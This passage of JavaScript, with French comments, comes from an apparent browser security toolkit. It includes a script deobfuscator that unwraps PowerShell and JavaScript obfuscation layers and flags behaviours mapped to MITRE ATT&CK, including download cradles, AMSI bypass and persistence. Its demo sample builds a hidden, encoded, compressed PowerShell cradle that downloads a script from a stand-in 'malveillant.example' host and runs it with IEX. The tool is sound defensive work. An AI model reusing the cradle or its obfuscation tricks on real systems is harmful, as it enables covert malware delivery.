    var formats = bytes[0] === 0x1f && bytes[1] === 0x8b ? ["gzip"] : bytes[0] === 0x78 ? ["deflate", "deflate-raw"] : ["deflate-raw"];
    var i = 0;
    function next(err) {
      if (err && err.message === "bomb") return Promise.reject(err);
      if (i >= formats.length) return Promise.resolve(null);
      var f = formats[i++];
      return decompress(bytes, f).then(function (out) { return { bytes: out, format: f }; }, next);
    }
    return next();
  }

  // Remplacement asynchrone (pour la décompression) : les correspondances sont traitées dans l'ordre.
  function replaceAsync(text, re, fn) {
    var parts = [], jobs = [], last = 0, m;
    re.lastIndex = 0;
    while ((m = re.exec(text)) !== null) {
      parts.push(text.slice(last, m.index));
      jobs.push({ m: m, idx: parts.length });
      parts.push(m[0]);
      last = m.index + m[0].length;
      if (!m[0].length) re.lastIndex++;
    }
    parts.push(text.slice(last));
    return jobs.reduce(function (p, j) {
      return p.then(function (n) {
        return Promise.resolve(fn.apply(null, j.m)).then(function (r) {
          if (r != null && r !== j.m[0]) { parts[j.idx] = r; return n + 1; }
          return n;
        });
      });
    }, Promise.resolve(0)).then(function (n) { return n ? { text: parts.join(""), n: n } : null; });
  }
  function replaceSync(text, re, fn) {
    var n = 0;
    var out = text.replace(re, function () {
      var r = fn.apply(null, arguments);
      if (r != null && r !== arguments[0]) { n++; return r; }
      return arguments[0];
    });
    return n ? { text: out, n: n } : null;
  }

  // Insère un contenu décodé : chaîne courte → littéral (combinable par les règles suivantes),
  // sinon bloc lisible encadré de commentaires.
  function embed(decoded, lang, label) {
    if (decoded.length <= 300 && !/[\r\n]/.test(decoded)) return lang === "js" ? jsQuote(decoded) : psQuote(decoded);
    var c = lang === "js" ? "//" : "#";
    var title = document.documentElement.lang === "fr" ? "décodé : " : "decoded: ";
    return "\n" + c + " ──── " + title + label + " ────\n" + decoded + "\n" + c + " ──── fin / end ────\n";
  }
  function lit(lang) { return lang === "js" ? JS_LIT : PS_LIT; }
  function val(s, lang) { return lang === "js" ? jsValue(s) : psValue(s); }
  function quote(v, lang) { return lang === "js" ? jsQuote(v) : psQuote(v); }

  var ENCODINGS = { unicode: "utf-16le", bigendianunicode: "utf-16be", utf8: "utf-8", ascii: "utf-8", default: "utf-8", utf7: "utf-8" };

  var RULES = [
    {
      fr: "Entrée entièrement en Base64 décodée", en: "Base64-only input decoded",
      run: function (t) {
        // tout le texte est un bloc Base64 (éventuellement coupé en lignes de 64 ou 76 caractères)
        var s = t.trim(), compact = s.replace(/\s+/g, "");
        if (compact.length < 16 || !/^[A-Za-z0-9+\/_-]+={0,2}$/.test(compact)) return null;
        if ((s.match(/\s+/g) || []).length > compact.length / 60 + 1) return null;
        var bytes;
        try { bytes = b64decode(compact); } catch (e) { return null; }
        if (bytes.length < 8) return null;
        if (looksCompressed(bytes)) {
          return tryDecompress(bytes).then(function (r) {
            if (!r) return null;
            var d = bytesToScript(r.bytes);
            return d.ok ? { text: d.text, n: 1 } : null;
          });
        }
        var d = bytesToScript(bytes);
        return d.ok && d.text !== t ? { text: d.text, n: 1 } : null;
      }
    },
    {
      fr: "Commande PowerShell -EncodedCommand décodée (Base64, UTF-16LE)", en: "PowerShell -EncodedCommand decoded (Base64, UTF-16LE)",
      run: function (t) {
        // PowerShell accepte tout préfixe de -EncodedCommand (-e, -en, -enc…) et -ec, et les
        // tirets typographiques (–, —) que les attaquants utilisent pour tromper les détections.
        return replaceSync(t, /([\-–—―\/])(e[a-z]{0,13})\b([ \t]{1,20})(["']?)([A-Za-z0-9+\/]{12,}={0,2})\4/gi,
          function (m, dash, flag, sp, q, blob) {
            var f = flag.toLowerCase();
            if ("encodedcommand".indexOf(f) !== 0 && f !== "ec") return null;
            var bytes;
            try { bytes = b64decode(blob); } catch (e) { return null; }
            var d = bytesToScript(bytes);
            if (!d.ok) return null;
            return "-Command {\n" + d.text + "\n}";
          });
      }
    },
    {
      fr: "Accents graves (`) retirés des mots-clés", en: "Backticks removed from keywords",
      lang: "ps",
      run: function (t) {
        if (t.indexOf("`") < 0) return null;
        return replaceSync(t, new RegExp(PS_SQ + "|" + PS_DQ + "|`(?=[A-Za-z0-9_\\-])", "g"),
          function (m) { return m === "`" ? "" : null; });
      }
    },
    {
      fr: "Accents circonflexes (^) de cmd.exe retirés", en: "cmd.exe carets (^) removed",
      run: function (t) {
        var hits = t.match(/[A-Za-z0-9]\^[A-Za-z0-9]/g);
        if (!hits || hits.length < 3) return null;
        return replaceSync(t, /([A-Za-z0-9])\^(?=[A-Za-z0-9])/g, function (m, c) { return c; });
      }
    },
    {
      fr: "Codes de caractères [char] convertis", en: "[char] codes converted",
      lang: "ps",
      run: function (t) {
        var r = replaceSync(t, new RegExp("\\[char\\[\\]\\]" + SP + "@?\\(" + SP + "(" + NUMLIST + ")" + SP + "\\)" + SP + "-join" + SP + "(?:''|\"\")", "gi"),
          function (m, list) { return psQuote(numsToString(list)); });
        if (r) return r;
        r = replaceSync(t, new RegExp("-join" + SP + "\\[char\\[\\]\\]" + SP + "@?\\(" + SP + "(" + NUMLIST + ")" + SP + "\\)", "gi"),
          function (m, list) { return psQuote(numsToString(list)); });
        if (r) return r;
        r = replaceSync(t, new RegExp("-join" + SP + "\\(" + SP + "(?:\\(" + SP + "(" + NUMLIST + ")" + SP + "\\)|(" + NUMLIST + "))" + SP + "\\|" + SP +
          "(?:%|foreach(?:-object)?)" + SP + "\\{" + SP + "\\[char\\]" + SP + "(?:\\[int\\]" + SP + ")?\\$_" + SP + "\\}" + SP + "\\)", "gi"),
          function (m, a, b) { return psQuote(numsToString(a || b)); });
        if (r) return r;
        // parenthèses seulement par paire : [char](65) ou [char]65, jamais la « ) » d'un appel voisin
        return replaceSync(t, new RegExp("\\[char\\]" + SP + "(?:\\[int\\]" + SP + ")?(?:\\(" + SP + "(" + NUM + ")" + SP + "\\)|(" + NUM + "))", "gi"),
          function (m, a, b) { var c = codeToChar(parseNum(a || b)); return c ? psQuote(c) : null; });
      }
    },
    {
      fr: "String.fromCharCode converti", en: "String.fromCharCode converted",
      lang: "js",
      run: function (t) {
        return replaceSync(t, new RegExp("String\\.fromCharCode\\(" + SP + "(" + NUMLIST + ")" + SP + "\\)", "g"),
          function (m, list) { return jsQuote(numsToString(list)); });
      }
    },
    {
      fr: "Séquences d'échappement (\\x41, \\u0041…) décodées", en: "Escape sequences (\\x41, \\u0041…) decoded",
      lang: "js",
      run: function (t) {
        return replaceSync(t, new RegExp(JS_LIT, "g"), function (m) {
          if (!/\\(?:x|u|[0-7])/.test(m)) return null;
          var q = jsQuote(jsValue(m));
          return q !== m ? q : null;
        });
      }
    },
    {
      fr: "Chaînes concaténées réunies", en: "Concatenated strings merged",
      run: function (t, lang) {
        // Priorité des opérateurs : un littéral suivi d'un appel (.split…), d'un index ([…]) ou,
        // en PowerShell, de -f, appartient d'abord à cette opération : on ne le fusionne pas.
        // De même en PowerShell pour un littéral précédé de -f (il est l'argument du format).
        var before = lang === "ps" ? "(?<!-f[ \\t]{0,20})" : "";
        var after = lang === "ps" ? "(?![ \\t]{0,20}(?:[.\\[]|-f(?![A-Za-z])))" : "(?![ \\t]{0,20}[.\\[])";
        var re = new RegExp(before + "(" + lit(lang) + ")" + SP + "\\+" + SP + "(" + lit(lang) + ")" + after, "g"), total = 0, r;
        while ((r = replaceSync(t, re, function (m, a, b) { return quote(val(a, lang) + val(b, lang), lang); }))) {
          t = r.text;
          total += r.n;
          if (total > 1e6) break;
        }
        return total ? { text: t, n: total } : null;
      }
    },
    {
      fr: "Parenthèses superflues autour d'une chaîne retirées", en: "Redundant parentheses around strings removed",
      run: function (t, lang) {
        return replaceSync(t, new RegExp("(?<![\\w\\])$.])\\(" + SP + "(" + lit(lang) + ")" + SP + "\\)", "g"),
          function (m, a) { return a; });
      }
    },
    {
      fr: "Opérateur de format -f appliqué", en: "Format operator -f applied",
      lang: "ps",
      run: function (t) {
        return replaceSync(t, new RegExp("(" + PS_LIT + ")" + SP + "-f(?![A-Za-z])" + SP + "(" + PS_LIT + "(?:" + SP + "," + SP + PS_LIT + "){0,1000})", "gi"),
          function (m, fmt, args) {
            var vals = args.match(new RegExp(PS_LIT, "g")).map(psValue);
            var ok = true;
            var out = psValue(fmt).replace(/\{\{|\}\}|\{(\d{1,4})(?:,-?\d{1,5})?(?::[^{}]{0,20})?\}/g, function (x, i) {
              if (x === "{{") return "{";
              if (x === "}}") return "}";
              if (vals[+i] === undefined) { ok = false; return x; }
              return vals[+i];
            });
            return ok ? psQuote(out) : null;
          });
      }
    },
    {
      fr: "Remplacements de texte (.Replace, -replace) appliqués", en: "Text replacements (.Replace, -replace) applied",
      run: function (t, lang) {
        var L_ = lit(lang);
        var r = replaceSync(t, new RegExp("(" + L_ + ")" + SP + "\\.replace(All)?\\(" + SP + "(" + L_ + ")" + SP + "," + SP + "(" + L_ + ")" + SP + "\\)", "gi"),
          function (m, s, all, a, b) {
            var v = val(s, lang), from = val(a, lang), to = val(b, lang);
            if (!from) return null;
            // .NET .Replace et JS replaceAll remplacent tout ; JS .replace seulement la première occurrence
            var allOcc = lang === "ps" || !!all;
            return quote(allOcc ? v.split(from).join(to) : v.replace(from, function () { return to; }), lang);
          });
        if (r || lang !== "ps") return r;
        // -replace utilise une expression régulière : on ne l'applique que si le motif est un simple texte
        return replaceSync(t, new RegExp("(" + PS_LIT + ")" + SP + "-(c|i)?replace" + SP + "(" + PS_LIT + ")(?:" + SP + "," + SP + "(" + PS_LIT + "))?", "gi"),
          function (m, s, mode, a, b) {
            var from = psValue(a), to = b ? psValue(b) : "";
            if (!from || /[\\^$.|?*+()[\]{}]/.test(from) || to.indexOf("$") >= 0) return null;
            var flags = "g" + ((mode || "").toLowerCase() === "c" ? "" : "i");
            return psQuote(psValue(s).replace(new RegExp(escapeRegex(from), flags), function () { return to; }));
          });
      }
    },
    {
      fr: "Chaînes inversées remises à l'endroit", en: "Reversed strings put back in order",
      run: function (t, lang) {
        if (lang === "js") {
          return replaceSync(t, new RegExp("(" + JS_LIT + ")\\.split\\(" + SP + "(?:''|\"\")" + SP + "\\)\\.reverse\\(" + SP + "\\)\\.join\\(" + SP + "(?:''|\"\")" + SP + "\\)", "g"),
            function (m, s) { return jsQuote(Array.from(jsValue(s)).reverse().join("")); });
        }
        var rev = function (s, n) { return Array.from(psValue(s)).reverse().slice(0, +n).join(""); };
        var r = replaceSync(t, new RegExp("-join" + SP + "\\(" + SP + "(" + PS_LIT + ")" + SP + "\\[" + SP + "-1" + SP + "\\.\\." + SP + "-" + SP + "(\\d{1,7})" + SP + "\\]" + SP + "\\)", "gi"),
          function (m, s, n) { return psQuote(rev(s, n)); });
        if (r) return r;
        return replaceSync(t, new RegExp("(" + PS_LIT + ")" + SP + "\\[" + SP + "-1" + SP + "\\.\\." + SP + "-" + SP + "(\\d{1,7})" + SP + "\\]" + SP + "-join" + SP + "(?:''|\"\")", "gi"),
          function (m, s, n) { return psQuote(rev(s, n)); });
      }
    },
    {
      fr: "Tableaux de chaînes joints", en: "String arrays joined",
      run: function (t, lang) {
        if (lang === "js") {
          return replaceSync(t, new RegExp("\\[" + SP + "(" + JS_LIT + "(?:" + SP + "," + SP + JS_LIT + "){0,10000})" + SP + ",?" + SP + "\\]\\.join\\(" + SP + "(" + JS_LIT + ")?" + SP + "\\)", "g"),
            function (m, items, sep) {
              return jsQuote(items.match(new RegExp(JS_LIT, "g")).map(jsValue).join(sep ? jsValue(sep) : ","));
            });
        }
        var r = replaceSync(t, new RegExp("-join" + SP + "\\(" + SP + "(" + PS_LIT + "(?:" + SP + "," + SP + PS_LIT + "){1,10000})" + SP + "\\)", "gi"),
          function (m, items) { return psQuote(items.match(new RegExp(PS_LIT, "g")).map(psValue).join("")); });
        if (r) return r;
        return replaceSync(t, new RegExp("\\(" + SP + "(" + PS_LIT + "(?:" + SP + "," + SP + PS_LIT + "){1,10000})" + SP + "\\)" + SP + "-join" + SP + "(" + PS_LIT + ")", "gi"),
          function (m, items, sep) { return psQuote(items.match(new RegExp(PS_LIT, "g")).map(psValue).join(psValue(sep))); });
      }
    },
    {
      fr: "unescape / decodeURIComponent décodés", en: "unescape / decodeURIComponent decoded",
      lang: "js",
      run: function (t) {
        return replaceSync(t, new RegExp("\\b(unescape|decodeURIComponent|decodeURI)\\(" + SP + "(" + JS_LIT + ")" + SP + "\\)", "g"),
          function (m, fn, s) {
            var v = jsValue(s);
            if (fn === "unescape") {
              return jsQuote(v.replace(/%u([0-9a-fA-F]{4})|%([0-9a-fA-F]{2})/g, function (x, u, h) {
                return String.fromCharCode(parseInt(u || h, 16));
              }));
            }
            try { return jsQuote(decodeURIComponent(v)); } catch (e) { return null; }
          });
      }
    },
    {
      fr: "Base64 décodé ([Convert]::FromBase64String)", en: "Base64 decoded ([Convert]::FromBase64String)",
      lang: "ps",
      run: function (t) {
        var wrapped = new RegExp("\\[(?:System\\.)?Text\\.Encoding\\]::(\\w{2,20})\\.GetString\\(" + SP + "\\[(?:System\\.)?Convert\\]::FromBase64String\\(" + SP + "(" + PS_LIT + ")" + SP + "\\)" + SP + "\\)", "gi");
        var r = replaceSync(t, wrapped, function (m, encName, s) {
          var bytes;
          try { bytes = b64decode(psValue(s)); } catch (e) { return null; }
          var d = bytesToScript(bytes, ENCODINGS[encName.toLowerCase()]);
          return d.ok ? embed(d.text, "ps", "Base64 (" + d.enc + ")") : null;
        });
        if (r) return r;
        var compressedHint = /DeflateStream|GzipStream|ZLibStream/i.test(t);
        return replaceAsync(t, new RegExp("\\[(?:System\\.)?Convert\\]::FromBase64String\\(" + SP + "(" + PS_LIT + ")" + SP + "\\)", "gi"),
          function (m, s) {
            var bytes;
            try { bytes = b64decode(psValue(s)); } catch (e) { return null; }
            if (compressedHint || looksCompressed(bytes)) {
              return tryDecompress(bytes).then(function (res) {
                if (!res) return null;
                var d = bytesToScript(res.bytes);
                return d.ok ? embed(d.text, "ps", "Base64 + " + res.format) : null;
              });
            }
            var d = bytesToScript(bytes);
            return d.ok ? embed(d.text, "ps", "Base64 (" + d.enc + ")") : null;
          });
      }
    },
    {
      fr: "Base64 décodé (atob)", en: "Base64 decoded (atob)",
      lang: "js",
      run: function (t) {
        function decode(s) {
          var bytes;
          try { bytes = b64decode(jsValue(s)); } catch (e) { return null; }
          var d = bytesToScript(bytes, "utf-8");
          return d.ok ? d.text : null;
        }
        var r = replaceSync(t, new RegExp("\\beval\\s{0,5}\\(" + SP + "atob\\(" + SP + "(" + JS_LIT + ")" + SP + "\\)" + SP + "\\)", "g"),
          function (m, s) { var v = decode(s); return v == null ? null : embed(v + "\n", "js", "eval(atob(…))"); });
        if (r) return r;
        return replaceSync(t, new RegExp("\\b(?:window\\.)?atob\\(" + SP + "(" + JS_LIT + ")" + SP + "\\)", "g"),
          function (m, s) { var v = decode(s); return v == null ? null : embed(v, "js", "atob"); });
      }
    },
    {
      fr: "Code passé à eval / IEX mis à plat (sans l'exécuter)", en: "Code passed to eval / IEX unwrapped (not executed)",
      run: function (t, lang) {
        if (lang === "js") {
          var r = replaceSync(t, new RegExp("\\b(?:new\\s{1,5})?Function\\s{0,5}\\(" + SP + "(" + JS_LIT + ")" + SP + "\\)" + SP + "\\(" + SP + "\\)", "g"),
            function (m, s) { return embed(jsValue(s) + "\n", "js", "Function(…)()"); });
          if (r) return r;
          return replaceSync(t, new RegExp("\\beval\\s{0,5}\\(" + SP + "(" + JS_LIT + ")" + SP + "\\)", "g"),
            function (m, s) { return embed(jsValue(s) + "\n", "js", "eval(…)"); });
        }
        var r2 = replaceSync(t, new RegExp("\\b(?:IEX|Invoke-Expression)\\s{0,5}\\(" + SP + "(" + PS_LIT + ")" + SP + "\\)", "gi"),
          function (m, s) { return embed(psValue(s) + "\n", "ps", "IEX"); });
        if (r2) return r2;
        r2 = replaceSync(t, new RegExp("\\b(?:IEX|Invoke-Expression)[ \\t]{1,5}(" + PS_LIT + ")", "gi"),
          function (m, s) { return embed(psValue(s) + "\n", "ps", "IEX"); });
        if (r2) return r2;
        return replaceSync(t, new RegExp("(" + PS_LIT + ")" + SP + "\\|" + SP + "(?:IEX|Invoke-Expression)\\b", "gi"),
          function (m, s) { return embed(psValue(s) + "\n", "ps", "| IEX"); });
      }
    },
    {
      fr: "Variables constantes remplacées par leur valeur", en: "Constant variables replaced by their value",
      run: function (t, lang) {
        var L_ = lit(lang), assigns = {}, values = {};
        var anyAssign = lang === "js"
          ? /(?:^|[^\w$.])([A-Za-z_$][\w$]{0,60})[ \t]{0,10}(?:[+\-*\/%|&^]|<<|>>>?)?=(?!=)/g
          : /\$([A-Za-z_][\w]{0,60})[ \t]{0,10}(?:[+\-*\/%])?=(?!=)/g;
        var m;
        while ((m = anyAssign.exec(t)) !== null) {
          var k = lang === "js" ? m[1] : m[1].toLowerCase();
          assigns[k] = (assigns[k] || 0) + 1;
        }
        var litAssign = lang === "js"
          ? new RegExp("(?:var|let|const)\\s{1,5}([A-Za-z_$][\\w$]{0,60})[ \\t]{0,10}=[ \\t]{0,10}(" + JS_LIT + ")[ \\t]{0,10}(?:;|\\n|$)", "g")
          : new RegExp("\\$([A-Za-z_][\\w]{0,60})[ \\t]{0,10}=[ \\t]{0,10}(" + PS_LIT + ")[ \\t]{0,10}(?:;|\\r?\\n|$)", "g");
        while ((m = litAssign.exec(t)) !== null) {
          var key = lang === "js" ? m[1] : m[1].toLowerCase();
          if (assigns[key] === 1) values[key] = m[2];
        }
        var names = Object.keys(values);
        if (!names.length) return null;
        var budget = 1024 * 1024;
        var usage = lang === "js"
          ? new RegExp(L_ + "|(?<![\\w$.])(" + names.map(escapeRegex).join("|") + ")(?![\\w$])(?![ \\t]{0,10}(?:[+\\-*\\/%|&^]|<<|>>>?)?=(?!=))", "g")
          : new RegExp(L_ + "|\\$(" + names.map(escapeRegex).join("|") + ")(?![\\w])(?![ \\t]{0,10}(?:[+\\-*\\/%])?=(?!=))", "gi");
        return replaceSync(t, usage, function (whole, name) {
          if (!name) return null; // un littéral : laissé tel quel
          var v = values[lang === "js" ? name : name.toLowerCase()];
          budget -= v.length;
          return budget > 0 ? v : null;
        });
      }
    }
  ];

  function deobfuscate(src) {
    var steps = [], text = src;
    function loop(i) {
      if (i >= DEOB_MAX_STEPS) return Promise.resolve({ text: text, steps: steps, capped: true });
      var lang = detectLang(text), k = 0;
      function tryRule() {
        if (k >= RULES.length) return Promise.resolve(false);
        var rule = RULES[k++];
        if (rule.lang && rule.lang !== lang) return tryRule();
        return Promise.resolve(rule.run(text, lang)).then(function (r) {
          if (!r || r.text === text) return tryRule();
          if (r.text.length > DEOB_MAX_OUTPUT) throw new Error("bomb");
          text = r.text;
          steps.push({ fr: rule.fr, en: rule.en, n: r.n, text: text });
          return true;
        });
      }
      return tryRule().then(function (applied) {
        return applied ? loop(i + 1) : { text: text, steps: steps, capped: false };
      });
    }
    return loop(0);
  }

  // Comportements typiques, rattachés aux techniques MITRE ATT&CK.
  var BEHAVIORS = [
    [/\b(?:IEX|Invoke-Expression)\b|\beval\s*\(|\bnew\s+Function\b|\.Invoke\s*\(/i, "Exécution de code généré à la volée", "Execution of dynamically generated code", "T1059"],
    [/DownloadString|DownloadFile|DownloadData|Invoke-WebRequest|\biwr\b|Invoke-RestMethod|\birm\b|Net\.WebClient|Start-BitsTransfer|bitsadmin|XMLHTTP|WinHttp|\bcurl(?:\.exe)?\s|\bwget\s|certutil[^\n]{0,40}urlcache/i, "Téléchargement depuis Internet", "Download from the Internet", "T1105"],
    [/-w(?:indowstyle)?\s{1,5}h(?:idden)?\b|\s-nop\b|\s-noni\b|-ExecutionPolicy\s{1,5}bypass|\s-ep\s{1,5}bypass|\s-enc(?:odedcommand)?\s/i, "PowerShell lancé discrètement (fenêtre cachée, politique contournée, commande encodée)", "Stealthy PowerShell launch (hidden window, bypassed policy, encoded command)", "T1059.001"],
    [/AmsiUtils|amsiInitFailed|AmsiScanBuffer/i, "Contournement de l'AMSI (analyse antivirus des scripts)", "AMSI bypass (antivirus script scanning)", "T1562.001"],
    [/(?:Set|Add)-MpPreference|DisableRealtimeMonitoring|ExclusionPath/i, "Désactivation ou exclusion de Microsoft Defender", "Microsoft Defender disabled or excluded", "T1562.001"],
    [/schtasks|Register-ScheduledTask|New-ScheduledTask/i, "Tâche planifiée (persistance)", "Scheduled task (persistence)", "T1053.005"],
    [/CurrentVersion\\Run|\\RunOnce\b|Start Menu\\Programs\\Startup|shell:startup/i, "Clé Run ou dossier Démarrage (persistance)", "Run key or Startup folder (persistence)", "T1547.001"],
    [/VirtualAlloc|CreateThread|WriteProcessMemory|CreateRemoteThread|NtCreateThreadEx/i, "Injection ou exécution de code en mémoire", "Process injection / in-memory execution", "T1055"],
    [/Reflection\.Assembly\]::Load|Assembly\]::Load\(|\.Load\(\s*\[Convert\]/i, "Chargement réflexif d'un programme .NET", "Reflective .NET assembly loading", "T1620"],
    [/ActiveXObject|WScript\.Shell|Shell\.Application|WScript\.CreateObject/i, "Exécution via Windows Script Host (JScript/VBScript)", "Execution via Windows Script Host (JScript/VBScript)", "T1059.007"],
    [/Get-WmiObject|Win32_Process|Invoke-WmiMethod|\bwmic\s/i, "Utilisation de WMI", "WMI usage", "T1047"],
    [/\b(?:whoami|systeminfo|ipconfig|nltest|Get-ComputerInfo)\b|\bnet\s{1,3}(?:user|group|localgroup)\b/i, "Reconnaissance du système", "System discovery", "T1082"],
    [/\b(?:mshta|rundll32|regsvr32)(?:\.exe)?\b/i, "Binaire système détourné (LOLBin)", "System binary proxy execution (LOLBin)", "T1218"],
    [/FromBase64String|\batob\s*\(|\[char\]|fromCharCode|-bxor|\s-e(?:nc|ncodedcommand|c)?\s+[A-Za-z0-9+\/]{20,}/i, "Obfuscation (encodage, codes de caractères…)", "Obfuscation (encoding, character codes…)", "T1027"]
  ];

  function initDeob() {
    var input = $("#do-input"), status = $("#do-status"), results = $("#do-results");
    var stepsEl = $("#do-steps"), output = $("#do-output"), behaviors = $("#do-behaviors");
    var iocs = $("#do-iocs"), defang = $("#do-defang"), runBtn = $("#do-run");
    var last = null;

    function renderIocs() {
      if (!last) return;
      var n = renderIocGroups(iocs, last.all, defang.checked, true);
      if (!n) iocs.innerHTML = '<p class="tool-hint">' + L("Aucun indicateur trouvé.", "No indicators found.") + "</p>";
    }

    function render(src, res) {
      results.hidden = false;
      stepsEl.innerHTML = "";
      res.steps.forEach(function (s, i) {
        var li = document.createElement("li");
        var head = document.createElement("span");
        head.innerHTML = L(esc(s.fr), esc(s.en)) + (s.n > 1 ? " <small class=\"tool-muted\">×" + s.n + "</small>" : "");
        li.appendChild(head);
        var det = document.createElement("details");
        var sum = document.createElement("summary");
        sum.innerHTML = L5("voir le texte après l'étape " + (i + 1), "show text after step " + (i + 1), "ver el texto tras la etapa " + (i + 1),
          "ver o texto após a etapa " + (i + 1), "Text nach Schritt " + (i + 1) + " anzeigen");
        var pre = document.createElement("pre");
        pre.className = "tool-output";
        pre.textContent = s.text.length > 20000 ? s.text.slice(0, 20000) + "\n…" : s.text;
        det.appendChild(sum);
        det.appendChild(pre);
        li.appendChild(det);
        stepsEl.appendChild(li);
      });
      if (!res.steps.length) {
        stepsEl.innerHTML = "<li>" + L("Aucune couche d'obfuscation reconnue.", "No known obfuscation layer found.") + "</li>";
      }
      output.textContent = res.text;

      // comportements et IOC : sur l'entrée ET toutes les couches intermédiaires
      var layers = [src].concat(res.steps.map(function (s) { return s.text; }));
      var all = layers.join("\n");
      if (all.length > DEOB_MAX_OUTPUT) all = all.slice(0, DEOB_MAX_OUTPUT);
      last = { all: all };
      behaviors.innerHTML = "";
      BEHAVIORS.forEach(function (b) {
        if (!b[0].test(all)) return;
        var li = document.createElement("li");
        var a = document.createElement("a");
        a.href = "https://attack.mitre.org/techniques/" + b[3].replace(".", "/") + "/";
        a.textContent = b[3];
        a.className = "deob-technique";
        a.rel = "noopener";
        a.target = "_blank";
        li.appendChild(a);
        var span = document.createElement("span");
        span.innerHTML = " " + L(esc(b[1]), esc(b[2]));
        li.appendChild(span);
        behaviors.appendChild(li);
      });
      if (!behaviors.children.length) {
        behaviors.innerHTML = "<li>" + L("Aucun comportement typique repéré.", "No typical behaviour spotted.") + "</li>";
      }
      renderIocs();

      var k = res.steps.length;
      if (res.capped) msg(status, "warn", L5("Arrêt après " + k + " étapes (limite de sécurité).", "Stopped after " + k + " steps (safety limit).",
        "Parada tras " + k + " etapas (límite de seguridad).", "Paragem após " + k + " etapas (limite de segurança).",
        "Abbruch nach " + k + " Schritten (Sicherheitsgrenze)."));
      else if (k) msg(status, "ok", L5(k + " couche(s) retirée(s). Le script n'a pas été exécuté.", k + " layer(s) removed. The script was not executed.",
        k + " capa(s) eliminada(s). El script no se ha ejecutado.", k + " camada(s) removida(s). O script não foi executado.",
        k + " Schicht(en) entfernt. Das Skript wurde nicht ausgeführt."));
      else msg(status, "warn", L("Aucune couche reconnue : le script est peut-être déjà en clair, ou utilise une obfuscation non gérée.", "No known layer: the script may already be in clear, or use unsupported obfuscation."));
    }

    function run() {
      var src = input.value;
      if (!src.trim()) { msg(status, "", ""); results.hidden = true; return; }
      if (src.length > DEOB_MAX_INPUT) {
        msg(status, "bad", L("Texte trop long (2 Mo maximum).", "Text too long (2 MB max)."));
        return;
      }
      runBtn.disabled = true;
      msg(status, "", L("Analyse en cours…", "Analysing…"));
      deobfuscate(src).then(function (res) { render(src, res); }, function (err) {
        msg(status, "bad", err && err.message === "bomb"
          ? L("Arrêt : le contenu décodé dépasse 8 Mo (possible bombe de décompression).", "Stopped: decoded content exceeds 8 MB (possible decompression bomb).")
          : L("Erreur pendant l'analyse.", "Error during analysis."));
      }).then(function () { runBtn.disabled = false; });
    }

    // Exemple inoffensif à trois couches : -EncodedCommand → Base64 compressé → script masqué.
    // Le domaine malveillant.example est réservé (RFC 2606) : il n'existe pas.
    function sample() {
      var inner = [
        "$u = 'ht'+'tp'+'://malveillant'+'.example/charge.ps1'",
        "$w = New-Object (\"{1}{0}\" -f 'bClient','Net.We')",
        "$s = $w.('Down'+'load'+'String').Invoke($u)",
        "I`E`X $s",
        "Write-Host ([char]66+[char]111+[char]110+[char]106+[char]111+[char]117+[char]114)"
      ].join("\n");
      if (typeof CompressionStream === "undefined") return Promise.resolve(inner);
      var cs = new CompressionStream("deflate-raw"), w = cs.writable.getWriter();
      w.write(enc.encode(inner));
      w.close();
      return new Response(cs.readable).arrayBuffer().then(function (buf) {
        var mid = "$d = New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('" +
          b64encode(new Uint8Array(buf)) + "'), [IO.Compression.CompressionMode]::Decompress)\n" +
          "IEX (New-Object IO.StreamReader($d)).ReadToEnd()";
        var u16 = new Uint8Array(mid.length * 2);
        for (var i = 0; i < mid.length; i++) { u16[2 * i] = mid.charCodeAt(i) & 0xff; u16[2 * i + 1] = mid.charCodeAt(i) >> 8; }
        return "powershell.exe -NoP -W Hidden -Enc " + b64encode(u16);
      });
    }

    runBtn.addEventListener("click", run);
    defang.addEventListener("change", renderIocs);
    $("#do-sample").addEventListener("click", function () {
      sample().then(function (s) { input.value = s; run(); });
    });
    $("#do-copy").appendChild(makeCopy(function () { return output.textContent; }));
  }

  /* ---------- Démarrage ---------- */
  var INIT = { generator: initGenerator, checker: initChecker, hash: initHash, encoder: initEncoder, jwt: initJwt, ioc: initIoc, deob: initDeob };
  function start() {
    applyPlaceholders();
    var main = document.querySelector("main[data-tool]");
    if (main && INIT[main.getAttribute("data-tool")]) INIT[main.getAttribute("data-tool")]();
  }
  if (document.readyState === "loading") document.addEventListener("DOMContentLoaded", start);
  else start();
})();
